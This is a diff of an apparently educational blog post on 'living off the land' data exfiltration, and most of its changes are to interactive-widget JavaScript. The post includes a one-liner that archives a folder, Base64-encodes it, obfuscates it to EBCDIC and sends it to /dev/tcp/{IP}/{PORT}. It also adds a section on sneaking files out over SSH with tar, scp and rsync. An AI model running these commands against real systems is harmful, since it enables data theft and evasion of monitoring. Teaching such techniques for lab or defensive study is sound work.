@@ -14,7 +14,7 @@ In this guide, I’m breaking down how to "live off the land." We’re talking a
 
 This is almost identical to the method in your text, but it uses **UDP** instead of TCP. This is useful if the firewall blocks TCP connections but leaves UDP open (often for DNS or media traffic).
 
-<div onclick="togglePerspective(this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
+<div onclick="togglePerspective(event,this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
   
   <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*a7G9SaEkrJfqFv4Y2N_FIQ.png" 
        data-label="Attacker (Listener)" 
@@ -41,8 +41,8 @@ This is almost identical to the method in your text, but it uses **UDP** instead
 </div>
 
 <script>
-function togglePerspective(container) {
-  event.stopPropagation();
+function togglePerspective(e, container) {
+  e.stopPropagation();
   var images = container.querySelectorAll('img');
   var label = container.querySelector('.perspective-label');
   var current = -1;
@@ -95,7 +95,7 @@ HTTPServer(("0.0.0.0", 80), P).serve_forever()
   {% endraw %}
 </div>
 
-<div onclick="togglePerspective(this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
+<div onclick="togglePerspective(event,this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
   
   <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*9ufNbLj6UEi7dmE6F5owaQ.png" 
        data-label="Attacker (Listener)" 
@@ -122,8 +122,8 @@ HTTPServer(("0.0.0.0", 80), P).serve_forever()
 </div>
 
 <script>
-function togglePerspective(container) {
-  event.stopPropagation();
+function togglePerspective(e, container) {
+  e.stopPropagation();
   var images = container.querySelectorAll('img');
   var label = container.querySelector('.perspective-label');
   var current = -1;
@@ -158,43 +158,75 @@ What is happening here is a pipeline:
   <span class="code-lang-tag">Terminal</span>
   <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
     <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
     </svg>
   </button>
+
   {% raw %}
-  <div class="interactive-command">
-    <div style="font-size:0.95em; margin-bottom:8px; color:#888;">Click any part to see a short explanation</div>
+  <div id="interactive-tcp" class="interactive-command">
+    <div style="font-size:0.95em; margin-bottom:8px; color:#888;">
+      Click any part to see a short explanation
+    </div>
+
     <pre style="background:#0b0c10;color:#f8f8f2;padding:12px;border-radius:6px;overflow:auto;white-space:nowrap;">
-      <code><span class="cmd-token" onclick="explain('tar')">tar zcf - task4/</span><span class="cmd-sep"> | </span><span class="cmd-token" onclick="explain('base64')">base64</span><span class="cmd-sep"> | </span><span class="cmd-token" onclick="explain('dd')">dd conv=ebcdic</span><span class="cmd-sep"> &gt; </span><span class="cmd-token" onclick="explain('devtcp')">/dev/tcp/{IP}/{PORT}</span></code>
+      <code>
+        <span class="cmd-token" data-key="tar">tar zcf - task4/</span>
+        <span class="cmd-sep"> | </span>
+        <span class="cmd-token" data-key="base64">base64</span>
+        <span class="cmd-sep"> | </span>
+        <span class="cmd-token" data-key="dd">dd conv=ebcdic</span>
+        <span class="cmd-sep"> &gt; </span>
+        <span class="cmd-token" data-key="devtcp">/dev/tcp/{IP}/{PORT}</span>
+      </code>
     </pre>
-    <div id="cmd-explain" style="margin-top:8px;padding:10px;border-radius:6px;background:#f6f6f6;color:#111;font-size:0.95em;min-height:34px;">Click a segment for a concise explanation.</div>
+
+    <div class="cmd-explain-box"
+         style="margin-top:8px;padding:10px;border-radius:6px;background:#f6f6f6;color:#111;font-size:0.95em;min-height:34px;">
+      Click a segment for a concise explanation.
+    </div>
   </div>
 
   <style>
-    .interactive-command pre{white-space:nowrap;overflow-x:auto}
-    .cmd-token{cursor:pointer;color:#8be9fd;padding:2px 4px;border-radius:4px;display:inline-block}
-    .cmd-token:hover{background:rgba(139,233,253,0.08)}
-    .cmd-sep{color:#bfbfbf;padding:0 6px}
+    .interactive-command pre { white-space: nowrap; overflow-x: auto; }
+    .cmd-token {
+      cursor: pointer;
+      color: #8be9fd;
+      padding: 2px 4px;
+      border-radius: 4px;
+      display: inline-block;
+    }
+    .cmd-token:hover { background: rgba(139,233,253,0.08); }
+    .cmd-sep { color: #bfbfbf; padding: 0 6px; }
   </style>
 
   <script>
-  (function(){
-    var explanations = {
-      tar: 'Create a gzip archive and write it to stdout (no file).',
-      base64: 'Encode binary stream into text-safe Base64.',
-      dd: 'Convert character encoding to EBCDIC (obfuscation).',
-      devtcp: 'Send the stream to attacker at given IP and port via a TCP socket.'
-    };
-    window.explain = function(k){
-      var el = document.getElementById('cmd-explain');
-      el.textContent = explanations[k] || 'No explanation available.';
-    };
-  })();
-  </script>
+    (function(){
+      const explanations = {
+        tar: 'Create a gzip-compressed tar archive and send it to stdout.',
+        base64: 'Encode the binary stream into Base64 so it can safely pass through text-only channels.',
+        dd: 'Convert the character encoding to EBCDIC (often used for obfuscation).',
+        devtcp: 'Send the data stream directly to a remote host via a TCP socket.'
+      };
 
+      // Use explicit ID to scope this block reliably
+      const container = document.getElementById('interactive-tcp');
+      if (container) {
+        container.addEventListener('click', function(e){
+          const token = e.target.closest('.cmd-token');
+          if (!token) return;
+
+          const box = container.querySelector('.cmd-explain-box');
+          const key = token.dataset.key;
+
+          box.textContent = explanations[key] || 'No explanation available.';
+        });
+      }
+    })();
+  </script>
   {% endraw %}
 </div>
+
 
 This command looks complex, but it is really just a chain of simple tools working together. At a high level, it takes a directory, packages it up, slightly disguises the data, and sends it directly to another machine over the network.
 
@@ -202,7 +234,7 @@ Nothing is written to disk. Everything happens as a live data stream.
 
 Each command receives data, transforms it, and passes it along to the next step.
 
-<div onclick="togglePerspective(this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
+<div onclick="togglePerspective(event,this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
   
   <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*K1WYiX_clGaRKxAQB12sQQ.png" 
        data-label="Attacker (Listener)" 
@@ -229,8 +261,8 @@ Each command receives data, transforms it, and passes it along to the next step.
 </div>
 
 <script>
-function togglePerspective(container) {
-  event.stopPropagation();
+function togglePerspective(e, container) {
+  e.stopPropagation();
   var images = container.querySelectorAll('img');
   var label = container.querySelector('.perspective-label');
   var current = -1;
@@ -251,3 +283,75 @@ function togglePerspective(container) {
   label.style.textAlign = images[next].getAttribute('data-align');
 }
 </script>
+
+### Exfiltration using SSH
+
+Most organizations allow outbound SSH (Port 22) for administrative purposes. Using a standard, trusted port makes your traffic look like routine maintenance rather than a data breach.
+
+Because the tunnel is encrypted, Deep Packet Inspection (DPI) cannot easily see that you are sending `passwords.db` or `company_finances.zip.`
+
+You don't always need to install new software; the tools already on the system are often enough for example:
+
+| Tool  | Primary Use Case |
+|-------|-----------------|
+| SCP (Secure Copy) | The most straightforward way to copy files over SSH. Best for one-off transfers. |
+| SFTP  | Useful for interactive sessions where you need to browse the remote file system before pulling data. |
+| Rsync | Highly efficient for large datasets; it supports compression and only sends the differences between files. |
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+
+  <div id="interactive-ssh" class="interactive-command">
+    <div style="font-size:0.95em; margin-bottom:8px; color:#888;">
+      Click any part to see a short explanation
+    </div>
+
+    <pre style="background:#0b0c10;color:#f8f8f2;padding:12px;border-radius:6px;overflow:auto;white-space:nowrap;">
+      <code>
+        <span class="cmd-token" data-key="tar1">tar cf - task5/</span>
+        <span class="cmd-sep"> | </span>
+        <span class="cmd-token" data-key="ssh">ssh ... "..."</span>
+        <span class="cmd-sep"> | </span>
+        <span class="cmd-token" data-key="tar2">tar xpf -</span>
+      </code>
+    </pre>
+
+    <div class="cmd-explain-box"
+         style="margin-top:8px;padding:10px;border-radius:6px;background:#f6f6f6;color:#111;font-size:0.95em;min-height:34px;">
+      Click a segment for a concise explanation.
+    </div>
+  </div>
+
+  <style>
+    .interactive-command pre { white-space: nowrap; overflow-x: auto; }
+    .cmd-token { cursor: pointer; color: #8be9fd; padding: 2px 4px; border-radius: 4px; display: inline-block; }
+    .cmd-token:hover { background: rgba(139,233,253,0.08); }
+    .cmd-sep { color: #bfbfbf; padding: 0 6px; }
+  </style>
+
+  <script>
+    (function(){
+      const explanations = {
+        tar1: 'The "-" tells tar to send the archive to STDOUT instead of a file.',
+        ssh: 'This carries that STDOUT stream securely across the network to the remote host.',
+        tar2: 'On the receiving end, "-" tells tar to read from STDIN and extract immediately.'
+      };
+
+      // Use explicit ID to scope this block reliably
+      const container = document.getElementById('interactive-ssh');
+      if (container) {
+        const tokens = container.querySelectorAll('.cmd-token');
+        tokens.forEach(token => {
+          token.addEventListener('click', function(e){
+            e.stopPropagation();
+            const box = container.querySelector('.cmd-explain-box');
+            const key = token.dataset.key;
+            box.textContent = explanations[key] || 'No explanation available.';
+          });
+        });
+      }
+    })();
+  </script>
+</div>
+
+
